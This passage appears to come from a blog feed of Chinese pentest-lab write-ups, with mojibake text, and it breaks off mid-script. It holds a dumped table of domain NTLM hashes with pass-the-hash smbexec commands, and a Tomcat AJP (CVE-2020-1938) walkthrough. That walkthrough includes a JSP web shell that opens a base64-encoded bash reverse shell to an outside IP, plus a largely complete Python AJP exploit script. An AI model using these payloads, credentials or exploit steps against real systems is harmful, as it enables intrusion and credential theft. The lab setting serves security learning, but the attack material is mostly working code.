b1040198d43631279a63b7fbc4c403af        512</span><br><span class="line">1139    yifu    4836347be16e6af2cd746d3f934bb55a        512</span><br><span class="line">1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512</span><br><span class="line">1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512</span><br><span class="line">1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512</span><br><span class="line">1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512</span><br><span class="line">1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512</span><br><span class="line">1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512</span><br><span class="line">1147    lili    b290a36500f7e39beee8a29851a9f8d5        512</span><br><span class="line">1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512</span><br><span class="line">1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512</span><br><span class="line">1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512</span><br><span class="line">1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512</span><br><span class="line">1152    langying        52a8a125cd369ab16a385f3fcadc757d        512</span><br><span class="line">1153    diaocai a14954d5307d74cd75089514ccca097a        512</span><br><span class="line">1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512</span><br><span class="line">1155    manxue  0255c42d9f960475f5ad03e0fee88589        512</span><br><span class="line">1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512</span><br><span class="line">1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512</span><br><span class="line">1158    louyou  a97ba112b411a3bfe140c941528a4648        512</span><br><span class="line">1159    maqun   485c35105375e0754a852cee996ed33b        512</span><br><span class="line">1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512</span><br><span class="line">1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512</span><br><span class="line">1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512</span><br><span class="line">1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512</span><br><span class="line">1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512</span><br><span class="line">1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512</span><br><span class="line">1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512</span><br><span class="line">1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512</span><br><span class="line">1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512</span><br><span class="line">1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512</span><br><span class="line">1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512</span><br><span class="line">1172    dujian  8f7846c78f03bf55685a697fe20b0857        512</span><br><span class="line">1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512</span><br><span class="line">1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512</span><br><span class="line">1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512</span><br><span class="line">1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512</span><br><span class="line">1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512</span><br><span class="line">502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514</span><br><span class="line">500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512</span><br><span class="line">1000    DC-PROGAME$     9534a3db96c011d40a133aa22ba4d65a        532480</span><br><span class="line">1181    WIN2019$        9f0b5119be244f76a96a9a4cd2c77af5        4096</span><br><span class="line">1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352</span><br><span class="line">1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352</span><br><span class="line">1180    yuxuan  376ece347142d1628632d440530e8eed        66048</span><br></pre></td></tr></table></figure><p>æ¨ªå‘åŸŸæ§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.12 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> impacket-smbexec -hashes :<span class="number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="number">172.22.6.25</span> -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Spoofing</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Spoofing.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Spoofing.html</id>
    <published>2024-08-20T15:22:58.701Z</published>
    <updated>2024-08-20T15:35:30.204Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Spoofing</h1><h2 id="flag01">flag01</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___|<span class="string"> </span>|<span class="string"> __</span></span><br><span class="line"><span class="string"> / /_\/____/ __</span>|<span class="string">/ __</span>|<span class="string"> &#x27;__/ _` </span>|<span class="string">/ __</span>|<span class="string"> </span>|<span class="string">/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (__</span>|<span class="string">   &lt;</span></span><br><span class="line"><span class="string">\____/     </span>|<span class="string">___/\___</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___</span>|<span class="string">_</span>|<span class="string">\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 39.98.118.194   is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">39.98.118.194:8009 open</span></span><br><span class="line"><span class="string">39.98.118.194:8080 open</span></span><br><span class="line"><span class="string">39.98.118.194:22 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 3</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle: http://39.98.118.194:8080 code:200 len:7091   title:åå°ç®¡ç†</span></span><br></pre></td></tr></table></figure><p>dirsearchæ‰«æå‘ç°docsè·¯ç”±ï¼Œè®¿é—®å‘ç°ä¸ºtomcat 9.0.30ï¼Œåˆ©ç”¨å·¥å…·è¿›è¡Œæ‰«æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240805163537886.png" alt="image-20240805163537886"></p><p>å‘ç°å­˜åœ¨AJPæ¼æ´ï¼Œä½¿ç”¨Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938å°è¯•è·å–shellï¼Œå…ˆä¸Šä¼ æ–‡ä»¶ï¼Œå¾—åˆ°æ–‡ä»¶è·¯å¾„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjEuMTIzLjk2LzI1MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240805164106771.png" alt="image-20240805164106771"></p><p>å†åˆ©ç”¨åŒ…å«è„šæœ¬åŒ…å«è¯¥æ–‡ä»¶è·å–shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-2020-1938-shell.py 39.99.227.248 -p 8009 -f upload/fe84d72a6dbdfd1c109f449cc3dc6dc8/20240807012205164.txt</span><br></pre></td></tr></table></figure><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span></span><br><span class="line"><span class="comment">#by ydhcui</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some references:</span></span><br><span class="line"><span class="comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_string</span>(<span class="params">s</span>):</span><br><span class="line"><span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;h&quot;</span>, -<span class="number">1</span>)</span><br><span class="line">l = <span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;H%dsb&quot;</span> % l, l, s.encode(<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack</span>(<span class="params">stream, fmt</span>):</span><br><span class="line">size = struct.calcsize(fmt)</span><br><span class="line">buf = stream.read(size)</span><br><span class="line"><span class="keyword">return</span> struct.unpack(fmt, buf)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_string</span>(<span class="params">stream</span>):</span><br><span class="line">size, = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> size == -<span class="number">1</span>: <span class="comment"># null string</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">res, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % size)</span><br><span class="line">stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotFoundException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpBodyRequest</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="comment"># server == web server, container == servlet</span></span><br><span class="line">SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="built_in">range</span>(<span class="number">2</span>)</span><br><span class="line">MAX_REQUEST_LENGTH = <span class="number">8186</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_stream, data_len, data_direction=<span class="literal">None</span></span>):</span><br><span class="line">self.data_stream = data_stream</span><br><span class="line">self.data_len = data_len</span><br><span class="line">self.data_direction = data_direction</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self</span>):</span><br><span class="line">data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x00</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">res += data</span><br><span class="line"><span class="keyword">if</span> self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">return</span> header + res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_and_receive</span>(<span class="params">self, socket, stream</span>):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data = self.serialize()</span><br><span class="line">socket.send(data)</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"><span class="keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="keyword">or</span> <span class="built_in">len</span>(data) == <span class="number">4</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpForwardRequest</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = <span class="built_in">range</span>(<span class="number">28</span>)</span><br><span class="line">REQUEST_METHODS = &#123;<span class="string">&#x27;GET&#x27;</span>: GET, <span class="string">&#x27;POST&#x27;</span>: POST, <span class="string">&#x27;HEAD&#x27;</span>: HEAD, <span class="string">&#x27;OPTIONS&#x27;</span>: OPTIONS, <span class="string">&#x27;PUT&#x27;</span>: PUT, <span class="string">&#x27;DELETE&#x27;</span>: DELETE, <span class="string">&#x27;TRACE&#x27;</span>: TRACE&#125;</span><br><span class="line"><span class="comment"># server == web server, container == servlet</span></span><br><span class="line">SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="built_in">range</span>(<span class="number">2</span>)</span><br><span class="line">COMMON_HEADERS = [<span class="string">&quot;SC_REQ_ACCEPT&quot;</span>,</span><br><span class="line"><span class="string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span>, <span class="string">&quot;SC_REQ_AUTHORIZATION&quot;</span>,</span><br><span class="line"><span class="string">&quot;SC_REQ_CONNECTION&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE2&quot;</span>,</span><br><span class="line"><span class="string">&quot;SC_REQ_HOST&quot;</span>, <span class="string">&quot;SC_REQ_PRAGMA&quot;</span>, <span class="string">&quot;SC_REQ_REFERER&quot;</span>, <span class="string">&quot;SC_REQ_USER_AGENT&quot;</span></span><br><span class="line">]</span><br><span class="line">ATTRIBUTES = [<span class="string">&quot;context&quot;</span>, <span class="string">&quot;servlet_path&quot;</span>, <span class="string">&quot;remote_user&quot;</span>, <span class="string">&quot;auth_type&quot;</span>, <span class="string">&quot;query_string&quot;</span>, <span class="string">&quot;route&quot;</span>, <span class="string">&quot;ssl_cert&quot;</span>, <span class="string">&quot;ssl_cipher&quot;</span>, <span class="string">&quot;ssl_session&quot;</span>, <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;ssl_key_size&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;stored_method&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_direction=<span class="literal">None</span></span>):</span><br><span class="line">self.prefix_code = <span class="number">0x02</span></span><br><span class="line">self.method = <span class="literal">None</span></span><br><span class="line">self.protocol = <span class="literal">None</span></span><br><span class="line">self.req_uri = <span class="literal">None</span></span><br><span class="line">self.remote_addr = <span class="literal">None</span></span><br><span class="line">self.remote_host = <span class="literal">None</span></span><br><span class="line">self.server_name = <span class="literal">None</span></span><br><span class="line">self.server_port = <span class="literal">None</span></span><br><span class="line">self.is_ssl = <span class="literal">None</span></span><br><span class="line">self.num_headers = <span class="literal">None</span></span><br><span class="line">self.request_headers = <span class="literal">None</span></span><br><span class="line">self.attributes = <span class="literal">None</span></span><br><span class="line">self.data_direction = data_direction</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_headers</span>(<span class="params">self</span>):</span><br><span class="line">self.num_headers = <span class="built_in">len</span>(self.request_headers)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">res = struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.num_headers)</span><br><span class="line"><span class="keyword">for</span> h_name <span class="keyword">in</span> self.request_headers:</span><br><span class="line"><span class="keyword">if</span> h_name.startswith(<span class="string">&quot;SC_REQ&quot;</span>):</span><br><span class="line">code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="number">1</span></span><br><span class="line">res += struct.pack(<span class="string">&quot;BB&quot;</span>, <span class="number">0xA0</span>, code)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">res += pack_string(self.request_headers[h_name])</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_attributes</span>(<span class="params">self</span>):</span><br><span class="line">res = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> attr <span class="keyword">in</span> self.attributes:</span><br><span class="line">a_name = attr[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="number">1</span></span><br><span class="line">res += struct.pack(<span class="string">&quot;b&quot;</span>, code)</span><br><span class="line"><span class="keyword">if</span> a_name == <span class="string">&quot;req_attribute&quot;</span>:</span><br><span class="line">aa_name, a_value = attr[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">res += pack_string(aa_name)</span><br><span class="line">res += pack_string(a_value)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res += pack_string(attr[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">res += struct.pack(<span class="string">&quot;B&quot;</span>, <span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self</span>):</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">res = struct.pack(<span class="string">&quot;bb&quot;</span>, self.prefix_code, self.method)</span><br><span class="line">res += pack_string(self.protocol)</span><br><span class="line">res += pack_string(self.req_uri)</span><br><span class="line">res += pack_string(self.remote_addr)</span><br><span class="line">res += pack_string(self.remote_host)</span><br><span class="line">res += pack_string(self.server_name)</span><br><span class="line">res += struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.server_port)</span><br><span class="line">res += struct.pack(<span class="string">&quot;?&quot;</span>, self.is_ssl)</span><br><span class="line">res += self.pack_headers()</span><br><span class="line">res += self.pack_attributes()</span><br><span class="line"><span class="keyword">if</span> self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">return</span> header + res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, raw_packet</span>):</span><br><span class="line">stream = StringIO(raw_packet)</span><br><span class="line">self.magic1, self.magic2, data_len = unpack(stream, <span class="string">&quot;bbH&quot;</span>)</span><br><span class="line">self.prefix_code, self.method = unpack(stream, <span class="string">&quot;bb&quot;</span>)</span><br><span class="line">self.protocol = unpack_string(stream)</span><br><span class="line">self.req_uri = unpack_string(stream)</span><br><span class="line">self.remote_addr = unpack_string(stream)</span><br><span class="line">self.remote_host = unpack_string(stream)</span><br><span class="line">self.server_name = unpack_string(stream)</span><br><span class="line">self.server_port = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">self.is_ssl = unpack(stream, <span class="string">&quot;?&quot;</span>)</span><br><span class="line">self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">self.request_headers = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.num_headers):</span><br><span class="line">code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> code &gt; <span class="number">0xA000</span>:</span><br><span class="line">h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="number">0xA001</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">h_name = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">stream.read(<span class="number">1</span>) <span class="comment"># 